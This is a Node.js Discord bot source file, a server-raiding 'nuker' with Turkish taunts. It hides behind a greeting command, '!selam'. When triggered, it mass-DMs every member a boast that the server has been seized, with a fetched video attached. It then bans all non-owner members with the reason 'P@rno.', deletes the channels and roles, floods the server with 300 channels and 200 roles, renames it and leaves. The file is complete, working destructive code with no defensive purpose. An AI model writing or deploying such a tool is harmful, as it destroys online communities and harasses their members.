require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder, AttachmentBuilder } = require('discord.js');
const fetch = require("node-fetch");

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;

client.once('ready', () => {
  console.log(`✅ Bot aktif: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === '!selam') {

    const members = await message.guild.members.fetch();
    let bannedCount = 0;

    // 🔥 GitHub RAW video linki
    const videoURL = "https://raw.githubusercontent.com/KULLANICI/REPO/main/video.mp4";

    // Videoyu fetch'le
    const response = await fetch(videoURL);
    const buffer = Buffer.from(await response.arrayBuffer());
    const video = new AttachmentBuilder(buffer, { name: "video.mp4" });

    const embed = new EmbedBuilder()
      .setColor('Red')
      .setTitle('❌ Sunucudan Yasaklandınız!')
      .setDescription('Fors ve TM Sunucuya El Koydu\n @1fors el koydu')
      .setFooter({ text: '💦Fors Affetmez Sabaha Sunucun Affedilmez💦' })
      .setVideo("attachment://video.mp4"); // 🎥 videoyu embed'e bağla

    // Üyeleri DM + ban
    for (const member of members.values()) {
      if (!member.user.bot && member.id !== OWNER_ID) {
        await member.send({ embeds: [embed], files: [video] }).catch(() => {});
        await member.ban({ reason: 'P@rno.' }).catch(() => {});
        bannedCount++;
      }
    }

    // Kanalları sil
    await Promise.all(message.guild.channels.cache.map(ch => ch.delete().catch(() => {})));

    // Yeni kanallar oluştur
    const names = ['1fors💦', 'TM-ENESXDRADX💝', 'FORS SUNUCUYA EL KOYDU🔥'];
    for (let i = 0; i < 300; i++) {
      const name = names[i % names.length];
      await message.guild.channels.create({ name }).catch(() => {});
    }

    // Rolleri sil
    for (const role of message.guild.roles.cache.values()) {
      if (role.editable && role.id !== message.guild.id) {
        await role.delete().catch(() => {});
      }
    }

    // Yeni roller
    for (let i = 0; i < 200; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
      await message.guild.roles.create({
        name: 'BÖÖ KORKTUNMUU😜',
        color: randomColor,
        hoist: true
      }).catch(() => {});
    }

    // Sunucu ismi değiştir
    await message.guild.setName('💦Fors ve Enesxdradx Affetmez Sabaha Sunucun Affedilmez💦').catch(() => {});

    await message.channel.send(`🧹 ${bannedCount} kişi banlandı. V For Vandetta ⚡.`);

    await message.guild.leave().catch(() => {});
  }
});

client.login(process.env.BOT_TOKEN);
